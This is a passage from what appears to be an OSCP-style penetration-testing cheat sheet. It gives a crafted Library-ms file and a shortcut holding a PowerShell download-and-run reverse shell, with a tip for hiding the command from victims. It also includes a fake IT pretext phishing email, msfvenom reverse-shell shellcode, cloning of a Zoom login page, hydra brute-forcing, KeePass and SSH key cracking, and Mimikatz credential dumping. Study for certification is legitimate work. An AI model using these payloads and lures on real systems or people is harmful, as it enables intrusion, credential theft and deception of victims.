</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>...
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>...
</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="nt">&lt;/libraryDescription&gt;</span>
</span></code></pre></div>
<p><strong><em>Add two tags providing information about the library</em></strong></p>
<blockquote>
<p>We can use <strong><em>@shell32.dll,-34575</em></strong> or <strong><em>@windows.storage.dll,-34582</em></strong>
</p>
</blockquote>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="nt">&lt;name&gt;</span>@windows.storage.dll,-34582<span class="nt">&lt;/name&gt;</span>
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="nt">&lt;version&gt;</span>6<span class="nt">&lt;/version&gt;</span>
</span></code></pre></div>
<p><strong><em>Add the <a href="https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-islibrarypinned">isLibraryPinned</a> and <a href="https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-iconreference">iconReference</a> tag</em></strong></p>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="nt">&lt;isLibraryPinned&gt;</span>true<span class="nt">&lt;/isLibraryPinned&gt;</span>
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="nt">&lt;iconReference&gt;</span>imageres.dll,-1003<span class="nt">&lt;/iconReference&gt;</span>
</span></code></pre></div>
<p><strong><em>Add the <a href="https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-templateinfo">templateInfo</a> tags, which contain the <a href="https://docs.microsoft.com/en-us/windows/win32/shell/schema-library-foldertype">folderType</a> tags</em></strong></p>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="nt">&lt;templateInfo&gt;</span>
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="nt">&lt;folderType&gt;</span>{7d49d726-3c21-4f05-99aa-fdc2c9474656}<span class="nt">&lt;/folderType&gt;</span>
</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="nt">&lt;/templateInfo&gt;</span>
</span></code></pre></div>
<p><strong><em>Specify the storage location where our library file should point to</em></strong></p>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="nt">&lt;searchConnectorDescriptionList&gt;</span>
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="nt">&lt;searchConnectorDescription&gt;</span>
</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="nt">&lt;isDefaultSaveLocation&gt;</span>true<span class="nt">&lt;/isDefaultSaveLocation&gt;</span>
</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="nt">&lt;isSupported&gt;</span>false<span class="nt">&lt;/isSupported&gt;</span>
</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="nt">&lt;simpleLocation&gt;</span>
</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="nt">&lt;url&gt;</span>http://10.10.10.10<span class="nt">&lt;/url&gt;</span>
</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="nt">&lt;/simpleLocation&gt;</span>
</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="nt">&lt;/searchConnectorDescription&gt;</span>
</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="nt">&lt;/searchConnectorDescriptionList&gt;</span>
</span></code></pre></div>
<p><strong><em>Entire Library File</em></strong></p>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="nt">&lt;libraryDescription</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://schemas.microsoft.com/windows/2009/library&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="nt">&lt;name&gt;</span>@windows.storage.dll,-34582<span class="nt">&lt;/name&gt;</span>
</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="nt">&lt;version&gt;</span>6<span class="nt">&lt;/version&gt;</span>
</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="nt">&lt;isLibraryPinned&gt;</span>true<span class="nt">&lt;/isLibraryPinned&gt;</span>
</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="nt">&lt;iconReference&gt;</span>imageres.dll,-1003<span class="nt">&lt;/iconReference&gt;</span>
</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a><span class="nt">&lt;templateInfo&gt;</span>
</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a><span class="nt">&lt;folderType&gt;</span>{7d49d726-3c21-4f05-99aa-fdc2c9474656}<span class="nt">&lt;/folderType&gt;</span>
</span><span id="__span-39-9"><a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a><span class="nt">&lt;/templateInfo&gt;</span>
</span><span id="__span-39-10"><a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a><span class="nt">&lt;searchConnectorDescriptionList&gt;</span>
</span><span id="__span-39-11"><a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a><span class="nt">&lt;searchConnectorDescription&gt;</span>
</span><span id="__span-39-12"><a id="__codelineno-39-12" name="__codelineno-39-12" href="#__codelineno-39-12"></a><span class="nt">&lt;isDefaultSaveLocation&gt;</span>true<span class="nt">&lt;/isDefaultSaveLocation&gt;</span>
</span><span id="__span-39-13"><a id="__codelineno-39-13" name="__codelineno-39-13" href="#__codelineno-39-13"></a><span class="nt">&lt;isSupported&gt;</span>false<span class="nt">&lt;/isSupported&gt;</span>
</span><span id="__span-39-14"><a id="__codelineno-39-14" name="__codelineno-39-14" href="#__codelineno-39-14"></a><span class="nt">&lt;simpleLocation&gt;</span>
</span><span id="__span-39-15"><a id="__codelineno-39-15" name="__codelineno-39-15" href="#__codelineno-39-15"></a><span class="nt">&lt;url&gt;</span>http://10.10.10.10<span class="nt">&lt;/url&gt;</span>
</span><span id="__span-39-16"><a id="__codelineno-39-16" name="__codelineno-39-16" href="#__codelineno-39-16"></a><span class="nt">&lt;/simpleLocation&gt;</span>
</span><span id="__span-39-17"><a id="__codelineno-39-17" name="__codelineno-39-17" href="#__codelineno-39-17"></a><span class="nt">&lt;/searchConnectorDescription&gt;</span>
</span><span id="__span-39-18"><a id="__codelineno-39-18" name="__codelineno-39-18" href="#__codelineno-39-18"></a><span class="nt">&lt;/searchConnectorDescriptionList&gt;</span>
</span><span id="__span-39-19"><a id="__codelineno-39-19" name="__codelineno-39-19" href="#__codelineno-39-19"></a><span class="nt">&lt;/libraryDescription&gt;</span>
</span></code></pre></div>
<p><strong><em>Create Shortcut file and store it in WebDav share to get Reverse Shell</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="gu">## Right-click on the desktop and click on New then on Shortcut</span>
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>powershell.exe -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://10.10.10.10:8000/powercat.ps1&#39;); powercat -c 192.168.119.3 -p 4444 -e powershell&quot;
</span></code></pre></div>
<aside>


If we expect that our victims are tech-savvy enough to check where the shortcut files are pointing, we can use a handy trick. Since our provided command looks very suspicious, we could just put a delimiter and benign command behind it to push the malicious command out of the visible area in the file's property menu. If a user were to check the shortcut, they would only see the benign command.

</aside>

<p><strong>Flow</strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="gu">## Pretext Email Example</span>
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>Hello! My name is Dwight, and I&#39;m a new member of the IT Team. 
</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>
</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>This week I am completing some configurations we rolled out last week.
</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>To make this easier, I&#39;ve attached a file that will automatically
</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>perform each step. Could you download the attachment, open the
</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>directory, and double-click &quot;automatic_configuration&quot;? Once you
</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>confirm the configuration in the window that appears, you&#39;re all done!
</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a>
</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a>If you have any questions, or run into any problems, please let me
</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a>know!
</span><span id="__span-41-12"><a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a>
</span><span id="__span-41-13"><a id="__codelineno-41-13" name="__codelineno-41-13" href="#__codelineno-41-13"></a><span class="gu">## Send crafted config.Library-ms file via attached file.</span>
</span><span id="__span-41-14"><a id="__codelineno-41-14" name="__codelineno-41-14" href="#__codelineno-41-14"></a><span class="gu">## Victim opens the config.Library-ms that points to File Explorer</span>
</span><span id="__span-41-15"><a id="__codelineno-41-15" name="__codelineno-41-15" href="#__codelineno-41-15"></a><span class="gu">## File Explorer shows WebDAV share that contains crafted Reverse Shell Shortcut </span>
</span></code></pre></div>
<aside>


> We could also have combined this technique with our previous Office macro attack, or any other type of client-side attacks.
> 
</aside>

<hr />
<h2 id="locating-public-exploits"><strong>Locating Public Exploits</strong></h2>
<p><strong><em>Online Exploit</em></strong></p>
<ul>
<li><strong>ExploitDB</strong></li>
</ul>
<p><strong><em>Offline Exploit</em></strong></p>
<ul>
<li><strong>SearchSploit</strong><ul>
<li><code>sudo apt update &amp;&amp; sudo apt install exploitdb</code></li>
<li><code>searchsploit -m windows/remote/48537.py</code></li>
</ul>
</li>
<li><strong><em>Nmap NSE Scripts</em></strong><ul>
<li><code>grep Exploits /usr/share/nmap/scripts/*.nse</code></li>
</ul>
</li>
</ul>
<hr />
<h2 id="fixing-exploits"><strong>Fixing Exploits</strong></h2>
<h3 id="fixing-memory-corruption-exploits"><strong>Fixing Memory Corruption Exploits</strong></h3>
<h4 id="buffer-overflow-in-a-nutshell"><strong>Buffer Overflow in a Nutshell</strong></h4>
<p><strong><em>Vulnerable code that holds 64 Bit char in buffer variable</em></strong></p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="o">*</span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span><span class="o">*</span>
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="p">...</span>
</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></code></pre></div>
<p><img alt="image.png" src="../OSCP%20CheatSheet/image.png" /></p>
<h4 id="cross-compiling-exploit-code"><strong>Cross-Compiling Exploit Code</strong></h4>
<p><strong><em>MinGW-w64 Compiler</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>mingw-w64
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>i686-w64-mingw32-gcc<span class="w"> </span><span class="o">[</span>C<span class="w"> </span>Program<span class="o">]</span><span class="w"> </span>-o<span class="w"> </span><span class="o">[</span>Output<span class="o">]</span>
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>
</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>wine<span class="w"> </span><span class="o">[</span>Output<span class="o">]</span>
</span></code></pre></div>
<p><strong><em>Generate C Shellcode</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=[</span>IP<span class="o">]</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=[</span>PORT<span class="o">]</span><span class="w"> </span><span class="nv">EXITFUNC</span><span class="o">=</span>thread<span class="w"> </span>-f<span class="w"> </span>c<span class="w"> </span>e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;\x00\x0a&quot;</span><span class="w"> </span>-v<span class="w"> </span>shellcode
</span></code></pre></div>
<hr />
<h2 id="phishing-basics">Phishing Basics</h2>
<h3 id="payloads-misdirection-and-speedbumps">Payloads, Misdirection, and Speedbumps</h3>
<blockquote>
<p>Attackers can bypass MotW using exploits like <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41091">CVE-2022-41091</a>, though security patches often close these gaps quickly.
</p>
<p>If an <strong>EXE</strong> file reached its intended destination, most users are aware of the danger of this type of file. Because of this, attackers have moved to other types of files, including <a href="https://www.malwarebytes.com/blog/news/2014/11/rogue-scr-file-links-circulating-in-steam-chat">SCRfiles</a>, <a href="https://trustedsec.com/blog/malicious-htas">HTA files</a>, and <a href="https://www.broadcom.com/support/security-center/protection-bulletin/yet-another-jscript-rat-spreads-via-phishing-campaign">JScriptfiles</a>.
</p>
</blockquote>
<p><strong><em>Microsoft Office Vulnerabilities</em></strong></p>
<ul>
<li>https://nvd.nist.gov/vuln/detail/CVE-2023-21716<ul>
<li><a href="https://github.com/JMousqueton/CVE-2023-21716">PoCs for this vulnerability</a></li>
</ul>
</li>
<li>https://nvd.nist.gov/vuln/detail/CVE-2017-11882</li>
<li>https://nvd.nist.gov/vuln/detail/CVE-2023-21608<ul>
<li><a href="https://github.com/hacksysteam/CVE-2023-21608">public PoCs for this vulnerability</a></li>
</ul>
</li>
</ul>
<p><strong><em>URL Shortener</em></strong></p>
<ul>
<li><a href="https://tinyurl.com/">TinyURL</a></li>
<li><a href="https://bitly.com/">Bitly</a></li>
</ul>
<p><strong><em>NTLM Theft</em></strong></p>
<p><a href="https://www.proofpoint.com/uk/blog/threat-insight/ta577s-unusual-attack-chain-leads-ntlm-data-theft">https://www.proofpoint.com/uk/blog/threat-insight/ta577s-unusual-attack-chain-leads-ntlmdata-theft</a></p>
<p><strong><em>MFA Bypass Techniques</em></strong></p>
<ul>
<li><a href="https://www.tripwire.com/state-of-security/mfa-prompt-bombing-what-you-need-know"><em>prompt bombing</em></a></li>
<li><a href="https://capec.mitre.org/data/definitions/701.html"><em>browser-in-the-middle</em></a><ul>
<li><a href="https://github.com/fkasler/cuddlephish"><em>cuddlephish</em></a></li>
</ul>
</li>
<li>Brute Force</li>
<li>SIM Swapping</li>
<li>Social Enginerring</li>
</ul>
<h3 id="hands-on-credential-phishing">Hands-On Credential Phishing</h3>
<p><strong><em>Cloning the Website</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>mkdir<span class="w"> </span>CloneWeb
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="nb">cd</span><span class="w"> </span>CloneWeb
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>
</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>wget<span class="w"> </span>-E<span class="w"> </span>-k<span class="w"> </span>-K<span class="w"> </span>-p<span class="w"> </span>-e<span class="w"> </span><span class="nv">robots</span><span class="o">=</span>off<span class="w"> </span>-H<span class="w"> </span>-Dzoom.us<span class="w"> </span>-nd<span class="w"> </span><span class="s2">&quot;https://zoom.us/signin#/login&quot;</span>
</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>
</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
</span></code></pre></div>
<p><strong><em>Remove OWASP CSRFGuard</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>grep<span class="w"> </span><span class="s2">&quot;OWASP&quot;</span><span class="w"> </span>*
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>grep<span class="w"> </span><span class="s2">&quot;csrf_js&quot;</span><span class="w"> </span>*
</span></code></pre></div>
<p><strong><em>Use LLM to make it look like the main website</em></strong></p>
<hr />
<h2 id="password-attacks"><strong>Password Attacks</strong></h2>
<h3 id="attacking-network-services-logins">Attacking Network Services Logins</h3>
<p><strong><em>SSH</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>hydra<span class="w"> </span>-l<span class="w"> </span><span class="o">[</span>user<span class="o">]</span><span class="w"> </span>-P<span class="w"> </span><span class="o">[</span>passwords<span class="o">]</span><span class="w"> </span>-s<span class="w"> </span><span class="o">[</span>Port<span class="o">]</span><span class="w"> </span>ssh://<span class="o">[</span>IP<span class="o">]</span>
</span></code></pre></div>
<p><strong><em>RDP</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>hydra<span class="w"> </span>-L<span class="w"> </span><span class="o">[</span>users<span class="o">]</span><span class="w"> </span>-p<span class="w"> </span><span class="o">[</span>password<span class="o">]</span><span class="w"> </span>rdp://<span class="o">[</span>IP<span class="o">]</span>
</span></code></pre></div>
<p><strong><em>HTTP POST Login Form</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>hydra<span class="w"> </span>-l<span class="w"> </span><span class="o">[</span>user<span class="o">]</span><span class="w"> </span>-P<span class="w"> </span><span class="o">[</span>passwords<span class="o">]</span><span class="w"> </span><span class="o">[</span>IP<span class="o">]</span><span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid&quot;</span>
</span></code></pre></div>
<h3 id="password-cracking-fundamentals"><strong>Password Cracking Fundamentals</strong></h3>
<h4 id="introduction-to-encryption-hashes-and-cracking">Introduction to Encryption, Hashes and Cracking</h4>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Symmetric-key_algorithm"><em>Symmetric encryption</em></a><ul>
<li>AES</li>
</ul>
</li>
<li><a href="https://en.wikipedia.org/wiki/Public-key_cryptography"><em>Asymmetric encryption</em></a><ul>
<li>RSA</li>
</ul>
</li>
<li><a href="https://en.wikipedia.org/wiki/Hash_function">Hash</a><ul>
<li>SHA / MD5</li>
</ul>
</li>
</ul>
<p><strong><em>Calculate Cracking Time</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="gu">## Calculate the keyspace for a five-character password</span>
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>echo -n &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot; | wc -c
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>python3 -c &quot;print(62**5)&quot;
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="gu">## Check Hashcat benchmaks</span>
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>hashcat -b
</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a>
</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a><span class="gu">## Calculate Time in Seconds - Convert Benchmark</span>
</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a>python3 -c &quot;print([Keyspace for *-characted password] / [Hashcat Benchmark])&quot;
</span></code></pre></div>
<h4 id="mutating-wordlists"><strong>Mutating Wordlists</strong></h4>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="gu">## Hashcat Rules</span>
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>ls -la /usr/share/hashcat/rules
</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>
</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a><span class="gu">## Create Rule Hashcat Cheat Sheet</span>
</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>https://hashcat.net/wiki/doku.php?id=rule_based_attack
</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a>
</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a><span class="gu">## Create Rule - Hashcat Example</span>
</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a>echo &quot;c&quot; &gt; demo.rule
</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a>hashcat -r demo.rule --stdout wordlist.txt
</span><span id="__span-51-10"><a id="__codelineno-51-10" name="__codelineno-51-10" href="#__codelineno-51-10"></a>
</span><span id="__span-51-11"><a id="__codelineno-51-11" name="__codelineno-51-11" href="#__codelineno-51-11"></a><span class="gu">## Create Rule - John Examle</span>
</span><span id="__span-51-12"><a id="__codelineno-51-12" name="__codelineno-51-12" href="#__codelineno-51-12"></a>echo &quot;[List.Rules:sshRules]\nc&quot; &gt; demo.rule
</span><span id="__span-51-13"><a id="__codelineno-51-13" name="__codelineno-51-13" href="#__codelineno-51-13"></a>cat demo.rule &gt;&gt; /etc/john/john.conf
</span></code></pre></div>
<h4 id="password-manager">Password Manager</h4>
<p><strong><em>Locating KeePass Database</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">kdbx</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></code></pre></div>
<p><strong><em>Crack KeePass Database</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>ls<span class="w"> </span>-la<span class="w"> </span>Database.kdbx
</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>
</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>keepass2john<span class="w"> </span>Database.kdbx<span class="w"> </span>&gt;<span class="w"> </span>keepass.hash
</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>
</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13400</span><span class="w"> </span>keepass.hash<span class="w"> </span><span class="o">[</span>rockyou<span class="o">]</span><span class="w"> </span>-r<span class="w"> </span>/usr/share/hashcat/rules/rockyou-30000.rule<span class="w"> </span>--force
</span></code></pre></div>
<h4 id="ssh-private-key-passphrase">SSH Private Key Passphrase</h4>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="gu">## Connect through SSH</span>
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>ssh -i id_rsa -p [port] [user]@[IP]
</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>
</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="gu">## Crack id_rsa if Password is prompted for that file</span>
</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>ssh2john id_rsa &gt; ssh.hash
</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a>john ssh.hash --wordlist=[wordlist] --rules=sshRules
</span></code></pre></div>
<h3 id="working-with-password-hashes"><strong>Working with Password Hashes</strong></h3>
<h4 id="ntlm-netntlmv2">NTLM / NetNTLMv2</h4>
<p><strong><em>Mimikatz</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>
</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="n">token</span><span class="p">::</span><span class="n">elevate</span>
</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>
</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">sam</span>
</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">secrets</span>
</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">logonpasswords</span>
</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a>
</span><span id="__span-55-10"><a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a><span class="nb">Import-Module</span> <span class="nb">Invoke-Mimikatz</span><span class="p">.</span><span class="n">ps1</span>
